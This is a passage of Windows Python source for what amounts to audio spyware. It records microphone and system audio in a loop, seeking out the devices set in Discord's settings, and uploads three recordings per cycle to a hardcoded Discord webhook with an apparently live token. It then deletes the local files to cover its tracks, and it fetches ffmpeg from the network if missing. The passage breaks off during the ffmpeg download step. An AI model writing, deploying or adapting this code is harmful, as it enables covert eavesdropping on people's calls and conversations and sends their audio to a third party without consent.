import os
import time
import numpy as np
from datetime import datetime
import winreg
import subprocess
import glob
import json
import shutil
import sys
import requests
import threading

# Change the default recording duration to 60 seconds
DEFAULT_RECORDING_DURATION = 60  # Changed from 10 seconds to 60 seconds

# Discord webhook URL for sending audio files
AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1345212795515568138/_Owji5OJk2p9MzNX3gaIZJ5wZfItA3NTllHW16ee5g9zzEv7wK2E76vlFE3qbOITwRIs"

# Flag to control the continuous recording loop
keep_recording = True

# Function to send audio file to Discord webhook
def send_audio_to_discord(file_path, message_prefix=""):
    """Send the audio file to Discord webhook."""
    try:
        if not os.path.exists(file_path):
            print(f"Error: File {file_path} does not exist.")
            return False
            
        file_size = os.path.getsize(file_path)
        if file_size == 0:
            print("Error: Audio file is empty.")
            return False
            
        print(f"Sending audio file to Discord: {file_path} ({file_size} bytes)")
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f, 'audio/mpeg' if file_path.endswith('.mp3') else 'audio/wav')
            }
            
            payload = {
                'content': f"{message_prefix}Audio recording taken at {timestamp}, Size: {file_size} bytes"
            }
            
            response = requests.post(AUDIO_WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code in [200, 204]:
                print(f"Successfully sent audio file to Discord at {timestamp}")
                return True
            else:
                print(f"Failed to send audio to Discord. Status code: {response.status_code}, Response: {response.text}")
                return False
                
    except Exception as e:
        print(f"Error sending audio to Discord: {e}")
        import traceback
        traceback.print_exc()
        return False

# Updated function to send all three audio files with delays
def send_all_audio_files(combined_file, mic_file, system_file):
    """
    Send all three audio files to Discord webhook with delays between them,
    then delete all files after successful upload.
    """
    files_sent = 0
    
    try:
        # First send the combined/mixed audio
        print("\nSending combined audio file...")
        if send_audio_to_discord(combined_file, "COMBINED: "):
            files_sent += 1
            
            # Wait 3 seconds before sending the next file
            print("Waiting 3 seconds before sending microphone audio...")
            time.sleep(3)
            
            # Send the microphone-only audio
            print("Sending microphone-only audio file...")
            if send_audio_to_discord(mic_file, "MICROPHONE: "):
                files_sent += 1
                
                # Wait 3 seconds before sending the next file
                print("Waiting 3 seconds before sending system audio...")
                time.sleep(3)
                
                # Send the system-only audio
                print("Sending system-only audio file...")
                if send_audio_to_discord(system_file, "SYSTEM: "):
                    files_sent += 1
        
        # Wait 1 second after sending all files before deleting
        time.sleep(1)
        
        # Delete all files if they exist
        print("\nDeleting audio files...")
        for file_path in [combined_file, mic_file, system_file]:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    print(f"Deleted: {file_path}")
                except Exception as e:
                    print(f"Error deleting file {file_path}: {e}")
        
        return files_sent == 3  # Return True only if all 3 files were sent
    
    except Exception as e:
        print(f"Error in send_all_audio_files: {e}")
        return False

def is_discord_installed():
    """
    Check if Discord is installed on Windows
    
    Returns:
        bool: True if Discord is installed, False otherwise
    """
    try:
        # Try to check Discord installation paths
        possible_paths = [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Discord'),
            os.path.join(os.environ.get('PROGRAMFILES', ''), 'Discord'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Discord')
        ]
        
        for path in possible_paths:
            if os.path.exists(path) and os.path.isdir(path):
                print(f"Discord installation found at: {path}")
                return True
                
        # Check registry for Discord
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Uninstall\Discord") as key:
                print("Discord found in registry")
                return True
        except WindowsError:
            pass
            
        # Check for Discord in AppData
        discord_app_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Discord', 'app-*')
        if os.path.exists(discord_app_path.replace('*', '')):
            print("Discord found in AppData")
            return True
            
        print("Discord installation not found")
        return False
    except Exception as e:
        print(f"Error checking for Discord: {e}")
        return False

def get_discord_audio_devices():
    """
    Get Discord's audio devices from settings
    
    Returns:
        tuple: (mic_device, speaker_device) if found, (None, None) otherwise
    """
    try:
        # Discord stores settings in JSON files in AppData
        discord_settings_path = os.path.join(os.environ.get('APPDATA', ''), 'Discord', 'settings.json')
        
        print(f"Looking for Discord settings at: {discord_settings_path}")
        
        if os.path.exists(discord_settings_path):
            try:
                with open(discord_settings_path, 'r', encoding='utf-8') as f:
                    settings = json.load(f)
                
                # Extract audio device information
                input_device = settings.get('inputDeviceId', None)
                output_device = settings.get('outputDeviceId', None)
                
                if input_device or output_device:
                    print(f"Discord audio settings found - Input ID: {input_device}, Output ID: {output_device}")
                    return input_device, output_device
            except json.JSONDecodeError as e:
                print(f"Error parsing Discord settings.json: {e}")
        
        # If the main settings.json didn't work, try searching in other locations
        print("Trying alternative Discord settings locations...")
        
        # Check the Local Storage directory
        local_storage_path = os.path.join(os.environ.get('APPDATA', ''), 'Discord', 'Local Storage', 'leveldb')
        if os.path.exists(local_storage_path):
            print(f"Checking Discord Local Storage at: {local_storage_path}")
            for file_path in glob.glob(os.path.join(local_storage_path, '*.ldb')):
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        
                        # Look for device IDs in the storage files
                        input_idx = content.find("inputDeviceId")
                        output_idx = content.find("outputDeviceId")
                        
                        input_device = None
                        output_device = None
                        
                        if input_idx > -1:
                            # Extract the value after "inputDeviceId":""
                            start = content.find('"', input_idx + 15) + 1
                            end = content.find('"', start)
                            if start > 0 and end > start:
                                input_device = content[start:end]
                        
                        if output_idx > -1:
                            # Extract the value after "outputDeviceId":""
                            start = content.find('"', output_idx + 16) + 1
                            end = content.find('"', start)
                            if start > 0 and end > start:
                                output_device = content[start:end]
                        
                        if input_device or output_device:
                            print(f"Found Discord audio settings in Local Storage - Input ID: {input_device}, Output ID: {output_device}")
                            return input_device, output_device
                except Exception as e:
                    print(f"Error reading Discord local storage file {os.path.basename(file_path)}: {e}")
        
        print("Discord audio settings not found or no device IDs set")
        return None, None
    except Exception as e:
        print(f"Error getting Discord audio devices: {e}")
        return None, None

def find_audio_device_by_id(sc, device_id, device_type="input"):
    """
    Find a specific audio device by its ID
    
    Args:
        sc: soundcard module
        device_id: Device ID to find
        device_type: Either "input" or "output"
        
    Returns:
        Audio device if found, None otherwise
    """
    if not device_id:
        return None
        
    try:
        devices = sc.all_microphones() if device_type == "input" else sc.all_speakers()
        
        print(f"Searching for Discord {device_type} device ID: {device_id}")
        
        # Try to match by ID
        for device in devices:
            if str(device.id) == device_id or device_id in str(device.id):
                print(f"Found {device_type} device matching Discord ID: {device.name}")
                return device
                
        # If not found, try to match by name if it looks like a name
        if not device_id.isdigit() and len(device_id) > 3:
            for device in devices:
                if device_id.lower() in device.name.lower():
                    print(f"Found {device_type} device matching Discord name: {device.name}")
                    return device
    except Exception as e:
        print(f"Error finding audio device by ID: {e}")
    
    return None

def is_ffmpeg_installed():
    """Check if ffmpeg is installed and available in PATH or script directory."""
    try:
        # First, check in the script's own directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
        script_ffmpeg = os.path.join(script_dir, "ffmpeg.exe")
        
        if os.path.exists(script_ffmpeg) and os.path.isfile(script_ffmpeg):
            print(f"Found ffmpeg in script directory: {script_ffmpeg}")
            return True, script_ffmpeg
            
        # Next, check in common %appdata% related paths
        appdata_paths = [
            os.path.join(os.environ.get('APPDATA', ''), 'ffmpeg', 'bin', 'ffmpeg.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'ffmpeg', 'bin', 'ffmpeg.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'ffmpeg', 'bin', 'ffmpeg.exe'),
        ]
        
        for path in appdata_paths:
            if os.path.exists(path):
                print(f"Found ffmpeg in AppData: {path}")
                return True, path
            
        # Try running ffmpeg command (PATH environment)
        result = subprocess.run(['ffmpeg', '-version'], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               check=False,
                               shell=True)
        if result.returncode == 0:
            print("Found ffmpeg in system PATH")
            return True, "ffmpeg"
            
        # Check other common locations
        common_paths = [
            r"C:\ffmpeg\bin\ffmpeg.exe",
            os.path.join(os.environ.get('PROGRAMFILES', ''), 'ffmpeg', 'bin', 'ffmpeg.exe'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'ffmpeg', 'bin', 'ffmpeg.exe'),
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                print(f"Found ffmpeg at: {path}")
                return True, path
                
        print("FFmpeg not found in any location")
        return False, None
    except Exception as e:
        print(f"Error checking for FFmpeg: {e}")
        return False, None

def record_audio(duration=DEFAULT_RECORDING_DURATION, sample_rate=44100, compress_audio=True, bit_depth=16, mp3_bitrate=128):
    """
    Record both microphone and system audio for specified duration and mix into a single audio file.
    Also save individual microphone and system audio files for separate uploads.
    
    Args:
        duration (int): Recording duration in seconds
        sample_rate (int): Sample rate for the recording
        compress_audio (bool): Whether to compress audio to MP3 format
        bit_depth (int): Bit depth for WAV files (16 or 24)
        mp3_bitrate (int): Bitrate for MP3 compression in kbps
    
    Returns:
        tuple: (combined_file, mic_file, system_file) - Paths to the saved audio files
    """
    print(f"Starting audio recording for {duration} seconds...")
    # Check for ffmpeg if compression is requested
    ffmpeg_path = None
    if compress_audio:
        ffmpeg_available, ffmpeg_path = is_ffmpeg_installed()
        if not ffmpeg_available:
            print("FFmpeg not found. MP3 compression will be disabled.")
            print("To enable MP3 compression, place ffmpeg.exe in the same directory as this script")
            print("Or install FFmpeg from: https://ffmpeg.org/download.html")
            compress_audio = False

    # Check if Discord is installed and get audio devices
    discord_installed = is_discord_installed()
    discord_mic_id = None
    discord_speaker_id = None
    
    # If Discord is installed, try to get its audio settings
    if discord_installed:
        discord_mic_id, discord_speaker_id = get_discord_audio_devices()
    
    # For reduced file size, potentially use lower sample rate
    # 22050 Hz is sufficient for speech and reduces file size by half compared to 44100
    if compress_audio and sample_rate > 22050:
        original_rate = sample_rate
        sample_rate = 22050
        print(f"Using reduced sample rate ({sample_rate} Hz instead of {original_rate} Hz) for smaller files")
    
    # Generate filename with timestamp - moved up here to use throughout function
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # File extension depends on compression setting
    file_extension = "mp3" if compress_audio else "wav"
    
    # Create filenames for all three recordings
    combined_file = os.path.join(script_dir, f"audio_mix_{timestamp}.{file_extension}")
    mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.{file_extension}")  
    system_file = os.path.join(script_dir, f"system_only_{timestamp}.{file_extension}")
    
    try:
        # Try to use soundcard library for recording both sources
        import soundcard as sc
        import soundfile as sf
        import threading
        
        # List all audio devices for debugging
        print("All microphones:")
        for i, mic in enumerate(sc.all_microphones()):
            print(f"  {i}: {mic.name} (ID: {mic.id})")
        
        print("\nAll speakers:")
        for i, speaker in enumerate(sc.all_speakers()):
            print(f"  {i}: {speaker.name} (ID: {speaker.id})")
        
        # Get appropriate microphone and speaker devices
        mic_device = None
        speaker_device = None
        
        if discord_installed and (discord_mic_id or discord_speaker_id):
            print("Attempting to use Discord audio devices...")
            
            # Try to find Discord's microphone
            if discord_mic_id:
                mic_device = find_audio_device_by_id(sc, discord_mic_id, "input")
                
            # Try to find Discord's speaker
            if discord_speaker_id:
                speaker_device = find_audio_device_by_id(sc, discord_speaker_id, "output")
        
        # Use system defaults if Discord devices not found
        if mic_device is None:
            mic_device = sc.default_microphone()
            print(f"Using system default microphone: {mic_device.name}")
        
        if speaker_device is None:
            speaker_device = sc.default_speaker()
            print(f"Using system default speaker: {speaker_device.name}")
        
        # Prepare containers for audio data
        mic_data = None
        system_data = None
        recording_done = threading.Event()
        
        # Function for mic recording thread
        def record_mic():
            nonlocal mic_data
            try:
                with mic_device.recorder(samplerate=sample_rate) as mic_recorder:
                    print(f"Recording from microphone: {mic_device.name}...")
                    mic_data = mic_recorder.record(numframes=sample_rate * duration)
                    print("Microphone recording complete")
            except Exception as e:
                print(f"Error recording from microphone: {e}")
        
        # Function for system audio recording thread
        def record_system():
            nonlocal system_data
            try:
                # Try to get loopback device
                loopback_device = sc.get_microphone(id=str(speaker_device.id), include_loopback=True)
                print(f"Using loopback device: {loopback_device.name}")
                with loopback_device.recorder(samplerate=sample_rate) as sys_recorder:
                    print("Recording system audio...")
                    system_data = sys_recorder.record(numframes=sample_rate * duration)
                    print("System audio recording complete")
            except Exception as e:
                print(f"Error recording system audio: {e}")
                try:
                    # Try using WASAPI loopback or alternative method
                    loopback_mic = next((mic for mic in sc.all_microphones() 
                                      if any(keyword in mic.name.lower() for keyword in ["stereo mix", "what u hear", "loopback"])), None)
                    if loopback_mic:
                        print(f"Using alternative loopback device: {loopback_mic.name}")
                        with loopback_mic.recorder(samplerate=sample_rate) as sys_recorder:
                            system_data = sys_recorder.record(numframes=sample_rate * duration)
                            print("System audio recording complete (alt method)")
                except Exception as e2:
                    print(f"Error with alternative system audio recording: {e2}")
        
        # Start recording threads
        print(f"Starting simultaneous recording for {duration} seconds...")
        mic_thread = threading.Thread(target=record_mic)
        system_thread = threading.Thread(target=record_system)
        
        mic_thread.start()
        system_thread.start()
        
        # Wait for recordings to complete
        mic_thread.join()
        system_thread.join()
        print("All recordings complete")
        
        # Check if both recordings succeeded
        if mic_data is not None and system_data is not None:
            print("Processing microphone and system audio...")
            
            # Ensure same number of channels - use mono for smaller file size if compressing
            target_channels = 1 if compress_audio else max(mic_data.shape[1], system_data.shape[1])
            
            # Process and save mic data
            mic_processed = np.copy(mic_data)
            if compress_audio and mic_processed.shape[1] > 1:
                mic_processed = np.mean(mic_processed, axis=1, keepdims=True)
            elif mic_processed.shape[1] != target_channels:
                if target_channels > mic_processed.shape[1]:
                    mic_processed = np.repeat(mic_processed, target_channels, axis=1)
                else:
                    mic_processed = np.mean(mic_processed, axis=1, keepdims=True)
            
            # Process and save system data
            system_processed = np.copy(system_data)
            if compress_audio and system_processed.shape[1] > 1:
                system_processed = np.mean(system_processed, axis=1, keepdims=True)
            elif system_processed.shape[1] != target_channels:
                if target_channels > system_processed.shape[1]:
                    system_processed = np.repeat(system_processed, target_channels, axis=1)
                else:
                    system_processed = np.mean(system_processed, axis=1, keepdims=True)
            
            # Ensure same length for all audio data
            min_length = min(mic_processed.shape[0], system_processed.shape[0])
            mic_processed = mic_processed[:min_length]
            system_processed = system_processed[:min_length]
            
            # Mix audio for combined file
            mixed_data = 2.0 * mic_processed + 0.6 * system_processed
            
            # Normalize to avoid clipping
            max_val = np.max(np.abs(mixed_data))
            if max_val > 1.0:
                mixed_data = mixed_data / max_val * 0.9  # Leave some headroom
            
            # Normalize individual files too
            mic_max_val = np.max(np.abs(mic_processed))
            if mic_max_val > 1.0:
                mic_processed = mic_processed / mic_max_val * 0.9
                
            sys_max_val = np.max(np.abs(system_processed))
            if sys_max_val > 1.0:
                system_processed = system_processed / sys_max_val * 0.9
            
            # Save the files - now always save all three files
            if compress_audio:
                try:
                    # Try to use pydub for MP3 compression
                    from pydub import AudioSegment
                    
                    # First save all files as WAV
                    temp_mixed_wav = os.path.join(script_dir, f"temp_mixed_{timestamp}.wav")
                    temp_mic_wav = os.path.join(script_dir, f"temp_mic_{timestamp}.wav")
                    temp_sys_wav = os.path.join(script_dir, f"temp_sys_{timestamp}.wav")
                    
                    # Write temporary WAV files
                    sf.write(temp_mixed_wav, mixed_data, sample_rate, subtype=f'PCM_{bit_depth}')
                    sf.write(temp_mic_wav, mic_processed, sample_rate, subtype=f'PCM_{bit_depth}')
                    sf.write(temp_sys_wav, system_processed, sample_rate, subtype=f'PCM_{bit_depth}')
                    
                    # Convert all to MP3
                    print("Converting audio files to MP3...")
                    temp_files = [
                        (temp_mixed_wav, combined_file),
                        (temp_mic_wav, mic_file),
                        (temp_sys_wav, system_file)
                    ]
                    
                    for temp_wav, mp3_file in temp_files:
                        try:
                            # Convert WAV to MP3
                            audio_segment = AudioSegment.from_wav(temp_wav)
                            
                            # Use the previously found FFmpeg path if available
                            if ffmpeg_path:
                                audio_segment.export(mp3_file, format="mp3", bitrate=f"{mp3_bitrate}k", 
                                                 parameters=["-codec:a", "libmp3lame", "-qscale:a", "2"],
                                                 executable=ffmpeg_path)
                            else:
                                # If we get here, something went wrong with our FFmpeg check
                                audio_segment.export(mp3_file, format="mp3", bitrate=f"{mp3_bitrate}k")
                        except Exception as e:
                            print(f"Error converting {temp_wav} to MP3: {e}")
                            # If MP3 conversion fails, rename WAV file
                            mp3_file = mp3_file.replace('.mp3', '.wav')
                            try:
                                os.rename(temp_wav, mp3_file)
                            except:
                                # If rename fails, leave the temp file as is
                                if "combined_file" in locals() and temp_wav == temp_mixed_wav:
                                    combined_file = temp_wav
                                elif "mic_file" in locals() and temp_wav == temp_mic_wav:
                                    mic_file = temp_wav
                                elif "system_file" in locals() and temp_wav == temp_sys_wav:
                                    system_file = temp_wav
                    
                    # Clean up temporary WAV files that were successfully converted
                    for temp_wav, mp3_file in temp_files:
                        if os.path.exists(mp3_file) and os.path.exists(temp_wav) and temp_wav != mp3_file:
                            try:
                                os.remove(temp_wav)
                            except:
                                pass
                    
                except ImportError:
                    print("MP3 compression requires pydub. Saving as WAV format.")
                    combined_file = combined_file.replace('.mp3', '.wav')
                    mic_file = mic_file.replace('.mp3', '.wav')
                    system_file = system_file.replace('.mp3', '.wav')
                    
                    # Save directly as WAV
                    sf.write(combined_file, mixed_data, sample_rate, subtype=f'PCM_{bit_depth}')
                    sf.write(mic_file, mic_processed, sample_rate, subtype=f'PCM_{bit_depth}')
                    sf.write(system_file, system_processed, sample_rate, subtype=f'PCM_{bit_depth}')
            else:
                # Save all directly as WAV with specified bit depth
                sf.write(combined_file, mixed_data, sample_rate, subtype=f'PCM_{bit_depth}')
                sf.write(mic_file, mic_processed, sample_rate, subtype=f'PCM_{bit_depth}')
                sf.write(system_file, system_processed, sample_rate, subtype=f'PCM_{bit_depth}')
            
            print(f"Saved three audio files:\n- Combined: {combined_file}\n- Mic: {mic_file}\n- System: {system_file}")
            return combined_file, mic_file, system_file
            
        elif mic_data is not None:
            print("Only microphone audio was captured")
            
            # Process microphone data
            if compress_audio:
                try:
                    from pydub import AudioSegment
                    import io
                    
                    # Convert to mono for smaller file size if needed
                    mic_processed = np.copy(mic_data)
                    if mic_processed.shape[1] > 1:
                        mic_processed = np.mean(mic_processed, axis=1, keepdims=True)
                    
                    # Save as WAV first
                    temp_wav = os.path.join(script_dir, f"temp_mic_{timestamp}.wav")
                    sf.write(temp_wav, mic_processed, sample_rate, subtype=f'PCM_{bit_depth}')
                    
                    # Convert to MP3
                    audio_segment = AudioSegment.from_wav(temp_wav)
                    audio_segment.export(mic_file, format="mp3", bitrate=f"{mp3_bitrate}k")
                    
                    # Use the same file for combined (since we only have mic)
                    combined_file = mic_file
                    
                    # Create an empty system file to keep the return signature consistent
                    system_file = os.path.join(script_dir, f"system_only_{timestamp}.{file_extension}")
                    with open(system_file, 'w') as f:
                        f.write("No system audio was recorded")
                    
                    # Remove temporary WAV
                    try:
                        os.remove(temp_wav)
                    except:
                        pass
                        
                except ImportError:
                    # Fall back to WAV
                    mic_file = mic_file.replace('.mp3', '.wav')
                    combined_file = mic_file
                    
                    # Save as WAV
                    sf.write(mic_file, mic_data, sample_rate, subtype=f'PCM_{bit_depth}')
                    
                    # Create empty system file
                    system_file = os.path.join(script_dir, f"system_only_{timestamp}.wav")
                    with open(system_file, 'w') as f:
                        f.write("No system audio was recorded")
            else:
                # Save as WAV
                sf.write(mic_file, mic_data, sample_rate, subtype=f'PCM_{bit_depth}')
                combined_file = mic_file
                
                # Create empty system file
                system_file = os.path.join(script_dir, f"system_only_{timestamp}.wav")
                with open(system_file, 'w') as f:
                    f.write("No system audio was recorded")
            
            print(f"Saved microphone audio as: {mic_file}")
            return combined_file, mic_file, system_file
            
        elif system_data is not None:
            print("Only system audio was captured")
            
            # Process system audio data (similar to microphone case above)
            if compress_audio:
                try:
                    from pydub import AudioSegment
                    import io
                    
                    # Convert to mono if needed
                    system_processed = np.copy(system_data)
                    if system_processed.shape[1] > 1:
                        system_processed = np.mean(system_processed, axis=1, keepdims=True)
                    
                    # Save as WAV first
                    temp_wav = os.path.join(script_dir, f"temp_sys_{timestamp}.wav")
                    sf.write(temp_wav, system_processed, sample_rate, subtype=f'PCM_{bit_depth}')
                    
                    # Convert to MP3
                    audio_segment = AudioSegment.from_wav(temp_wav)
                    audio_segment.export(system_file, format="mp3", bitrate=f"{mp3_bitrate}k")
                    
                    # Use the same file for combined (since we only have system)
                    combined_file = system_file
                    
                    # Create an empty mic file
                    mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.{file_extension}")
                    with open(mic_file, 'w') as f:
                        f.write("No microphone audio was recorded")
                    
                    # Remove temporary WAV
                    try:
                        os.remove(temp_wav)
                    except:
                        pass
                        
                except ImportError:
                    # Fall back to WAV
                    system_file = system_file.replace('.mp3', '.wav')
                    combined_file = system_file
                    
                    # Save as WAV
                    sf.write(system_file, system_data, sample_rate, subtype=f'PCM_{bit_depth}')
                    
                    # Create empty mic file
                    mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.wav")
                    with open(mic_file, 'w') as f:
                        f.write("No microphone audio was recorded")
            else:
                # Save as WAV
                sf.write(system_file, system_data, sample_rate, subtype=f'PCM_{bit_depth}')
                combined_file = system_file
                
                # Create empty mic file
                mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.wav")
                with open(mic_file, 'w') as f:
                    f.write("No microphone audio was recorded")
            
            print(f"Saved system audio as: {system_file}")
            return combined_file, mic_file, system_file
            
        else:
            print("Both recording methods failed")
            # If both methods failed, create empty placeholder files to keep return signature consistent
            combined_file = os.path.join(script_dir, f"audio_mix_{timestamp}.txt")
            mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.txt")
            system_file = os.path.join(script_dir, f"system_only_{timestamp}.txt")
            
            with open(combined_file, 'w') as f:
                f.write("Recording failed - no audio captured")
            shutil.copy2(combined_file, mic_file)
            shutil.copy2(combined_file, system_file)
            
            raise Exception("Failed to record audio from any source")
        
    except Exception as e:
        print(f"Error with soundcard library: {e}")
        print("Falling back to PyAudio...")
        
        try:
            import pyaudio
            import wave
            
            p = pyaudio.PyAudio()
            
            # Set up audio parameters
            format = pyaudio.paInt16  # 16-bit audio for reasonable quality
            chunk = 1024
            
            # For PyAudio, use reduced sample rate for smaller files if compressing
            if compress_audio and sample_rate > 22050:
                sample_rate = 22050
            
            # Find WASAPI loopback device (for capturing system audio)
            device_index = None
            device_channels = 2  # Default
            
            # Look for WASAPI loopback devices
            print("Available audio devices:")
            wasapi_loopback_found = False
            
            # Look for Discord's audio device if Discord is installed
            discord_device_found = False
            
            for i in range(p.get_device_count()):
                device_info = p.get_device_info_by_index(i)
                print(f"Device {i}: {device_info['name']}")
                
                # Check if this is a Discord audio device
                if discord_installed and discord_mic_id and str(discord_mic_id) in str(device_info):
                    device_index = i
                    device_channels = min(2, int(device_info.get('maxInputChannels', 2)))
                    discord_device_found = True
                    print(f"Selected Discord audio device: {device_info['name']} with {device_channels} channels")
                    break
                    
                # Look for "wasapi" and "loopback" or similar keywords in device name
                if not discord_device_found and ("stereo mix" in device_info['name'].lower() or 
                    "what u hear" in device_info['name'].lower() or 
                    "loopback" in device_info['name'].lower()):
                    device_index = i
                    device_channels = min(2, int(device_info.get('maxInputChannels', 2)))
                    wasapi_loopback_found = True
                    print(f"Selected loopback device: {device_info['name']} with {device_channels} channels")
                    # Don't break here, continue looking for Discord device
            
            # If no specific loopback device found, try to use default input
            if not wasapi_loopback_found and not discord_device_found:
                print("No loopback device found. To capture system audio, you need to:")
                print("1. Enable 'Stereo Mix' in Windows sound settings, or")
                print("2. Install virtual audio cable software, or")
                print("3. Install the 'soundcard' package: pip install soundcard soundfile")
                print("\nFalling back to default microphone which won't capture system sounds.")
                
                for i in range(p.get_device_count()):
                    device_info = p.get_device_info_by_index(i)
                    max_input_channels = int(device_info.get('maxInputChannels', 0))
                    if max_input_channels > 0:
                        device_index = i
                        device_channels = min(2, max_input_channels)
                        print(f"Using microphone: {device_info['name']} with {device_channels} channels")
                        break
            
            if device_index is None:
                raise Exception("No suitable audio input device found")
            
            # Open stream for recording
            stream = p.open(
                format=format,
                channels=1 if compress_audio else device_channels,  # Use mono for compressed audio
                rate=sample_rate,
                input=True,
                input_device_index=device_index,
                frames_per_buffer=chunk
            )
            
            print(f"Recording system audio for {duration} seconds...")
            frames = []
            
            # Record for specified duration
            for i in range(0, int(sample_rate / chunk * duration)):
                data = stream.read(chunk, exception_on_overflow=False)
                frames.append(data)
            
            print("Recording finished")
            
            # Stop and close the stream
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # Generate filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            script_dir = os.path.dirname(os.path.abspath(__file__))
            
            # Determine file type based on compression setting
            file_extension = "mp3" if compress_audio else "wav"
            filename = os.path.join(script_dir, f"audio_{timestamp}.{file_extension}")
            
            # If compressing, convert to MP3
            if compress_audio:
                try:
                    from pydub import AudioSegment
                    
                    # First save as temporary WAV
                    temp_wav = os.path.join(script_dir, f"temp_{timestamp}.wav")
                    
                    # Save as WAV file temporarily
                    wf = wave.open(temp_wav, 'wb')
                    wf.setnchannels(1 if compress_audio else device_channels)
                    wf.setsampwidth(p.get_sample_size(format))
                    wf.setframerate(sample_rate)
                    wf.writeframes(b''.join(frames))
                    wf.close()
                    
                    try:
                        # Convert WAV to MP3
                        audio_segment = AudioSegment.from_wav(temp_wav)
                        
                        # Use the previously found FFmpeg path if available
                        if ffmpeg_path:
                            print(f"Using FFmpeg at: {ffmpeg_path}")
                            audio_segment.export(filename, format="mp3", bitrate=f"{mp3_bitrate}k", 
                                             parameters=["-codec:a", "libmp3lame", "-qscale:a", "2"],
                                             executable=ffmpeg_path)
                        else:
                            # Try export without explicit path as last resort
                            audio_segment.export(filename, format="mp3", bitrate=f"{mp3_bitrate}k")
                        
                        # Remove temporary WAV file
                        try:
                            os.remove(temp_wav)
                        except:
                            pass
                            
                        print(f"Compressed audio saved to: {filename}")
                        
                    except Exception as e:
                        print(f"Error during MP3 conversion: {e}")
                        print("Falling back to WAV format.")
                        
                        # If MP3 conversion fails, just use the WAV file
                        filename = filename.replace('.mp3', '.wav')
                        
                        # If we already have a temp WAV, just rename it
                        if os.path.exists(temp_wav):
                            try:
                                os.rename(temp_wav, filename)
                                print(f"Audio saved as WAV: {filename}")
                            except:
                                # If rename fails, leave the temp file as is
                                print(f"Audio saved as WAV: {temp_wav}")
                                filename = temp_wav
                        
                except ImportError:
                    # If pydub is not available, fall back to WAV
                    filename = filename.replace('.mp3', '.wav')
                    wf = wave.open(filename, 'wb')
                    wf.setnchannels(1 if compress_audio else device_channels)
                    wf.setsampwidth(p.get_sample_size(format))
                    wf.setframerate(sample_rate)
                    wf.writeframes(b''.join(frames))
                    wf.close()
                    print(f"Audio saved to: {filename}")
            else:
                # Save as WAV file
                wf = wave.open(filename, 'wb')
                wf.setnchannels(device_channels)
                wf.setsampwidth(p.get_sample_size(format))
                wf.setframerate(sample_rate)
                wf.writeframes(b''.join(frames))
                wf.close()
                print(f"Audio saved to: {filename}")
            
            # For PyAudio implementation, create placeholder files for mic and system
            # since it can only record from one source at a time
            if 'filename' in locals():
                # If main recording succeeded
                combined_file = filename
                
                # Create placeholder files for the other two
                file_extension = "mp3" if compress_audio else "wav"
                mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.{file_extension}")
                system_file = os.path.join(script_dir, f"system_only_{timestamp}.{file_extension}")
                
                # Since we don't know if this is mic or system, copy to both 
                shutil.copy2(combined_file, mic_file)
                shutil.copy2(combined_file, system_file)
                
                print("Using PyAudio fallback: copied main recording to all three files")
                return combined_file, mic_file, system_file
            else:
                # If recording failed completely
                combined_file = os.path.join(script_dir, f"audio_mix_{timestamp}.txt")
                mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.txt")
                system_file = os.path.join(script_dir, f"system_only_{timestamp}.txt")
                
                with open(combined_file, 'w') as f:
                    f.write("PyAudio recording failed - no audio captured")
                shutil.copy2(combined_file, mic_file)
                shutil.copy2(combined_file, system_file)
                
                raise Exception("PyAudio recording failed")
                
        except Exception as e:
            print(f"Error recording with PyAudio: {e}")
            # Make sure we always return something
            combined_file = os.path.join(script_dir, f"audio_mix_{timestamp}.txt")
            mic_file = os.path.join(script_dir, f"mic_only_{timestamp}.txt")
            system_file = os.path.join(script_dir, f"system_only_{timestamp}.txt")
            
            with open(combined_file, 'w') as f:
                f.write(f"Recording failed: {str(e)}")
            shutil.copy2(combined_file, mic_file)
            shutil.copy2(combined_file, system_file)
            
            return combined_file, mic_file, system_file

def check_and_download_ffmpeg():
    """Attempts to download FFmpeg if not found in the system."""
    try:
        ffmpeg_available, _ = is_ffmpeg_installed()
        if not ffmpeg_available:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            ffmpeg_path = os.path.join(script_dir, "ffmpeg.exe")
            
            print("FFmpeg not found. Attempting to download minimal FFmpeg...")
            
            # URL for a minimal FFmpeg build
            ffmpeg_url = "https://github.com/GyanD/codexffmpeg/releases/download/2023-05-05-git-1dbb26306a/ffmpeg-2023-05-05-git-1dbb26306a-essentials_build.zip"
            
            import urllib.request
            import zipfile
            
            # Download zip file
            temp_zip = os.path.join(script_dir, "ffmpeg_temp.zip")
            print("Downloading FFmpeg (this may take a few moments)...")
            
            # Use a simple progress bar
            def report_progress(blocknum, blocksize, totalsize):
                percent = int(100 * blocknum * blocksize / totalsize)
                sys.stdout.write(f"\rDownload progress: {percent}%")
                sys.stdout.flush()
                
            urllib.request.urlretrieve(ffmpeg_url, temp_zip, reporthook=report_progress)
            print("\nDownload complete. Extracting...")
            
            # Extract the zip file
